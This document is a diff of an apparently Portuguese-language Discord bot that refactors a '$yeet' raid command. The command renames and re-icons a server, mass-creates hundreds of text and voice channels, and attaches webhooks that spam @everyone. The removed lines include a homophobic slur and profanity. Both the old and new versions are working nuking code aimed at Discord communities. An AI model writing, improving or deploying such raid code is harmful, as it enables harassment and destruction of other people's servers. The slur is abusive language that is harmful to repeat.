@@ -7,6 +7,7 @@ const vivo = require(`./server`)
 const prefix = '$';
 
 let i = 0;
+let mode = '';
 
 client.on("ready", () => { 
     console.clear()
@@ -22,36 +23,26 @@ client.on("message", (message) => {
     const args = message.content.slice(prefix.length).trim().split(/ +/g);
     const comando = args.shift().toLowerCase();
     switch(comando) {
-        case "yeet":
-            message.delete();
-            let i;
-            message.guild.setIcon(`./image.png`)
-            if(!args[0]){ 
-                message.guild.setName('haha admin go grr')
-                for(i = 0; i < 251; i++){
-                  if(message.guild.channels.cache.size == "500") break;
-                    message.guild.channels.create(`haha admin go grr`, {type: `text`}).then(m =>{
-                        m.createWebhook("get raided faggots").then(w => {
-                          const case1hook = new Discord.WebhookClient(w.id, w.token)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                        })
-                    })
-                    message.guild.channels.create(`haha admin go grr`, {type: `voice`})
-                 }
-            } else {
-                message.guild.setName(`${args.slice(0).join(' ')}`)
-                for(i = 0; i < 251; i++){
-                    if(message.guild.channels.cache.size == "500") break;
-                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `text`}).then(m =>{
-                        m.createWebhook("get raided faggots").then(w => {
-                          const case2hook = new Discord.WebhookClient(w.id, w.token)
-                          case2hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
-                        })
-                    })
-                    message.guild.channels.create(`${args.slice(0).join(' ')}`, {type: `voice`})
+        case 'yeet':
+			message.delete();
+			message.guild.setIcon(`./image.png`);
+			if (!args[0]) mode = `haha admin go grr`;
+            if (args[0]) mode = args.slice(0, 32).join(` `)
+			message.guild.setName(`${mode}`);
+			try {
+                for (i = 0; i < 251; i++) {
+				    message.guild.channels.create(`${mode}`, {type: `text`}).then(m => {
+					    m.createWebhook('XDDDD').then(w => {
+					    	const hook = new Discord.WebhookClient(w.id, w.token);
+					    	hook.send(`@everyone tirei o arroz de um robô e olha no que deu`)
+					    });
+				    });
+				    message.guild.channels.create(`${mode}`, {type: `voice`});
                 }
+			} catch (e) {
+                break;
             }
-        break;
+		break;
         case "del":
             message.delete();
             message.guild.setIcon(`./image.png`)
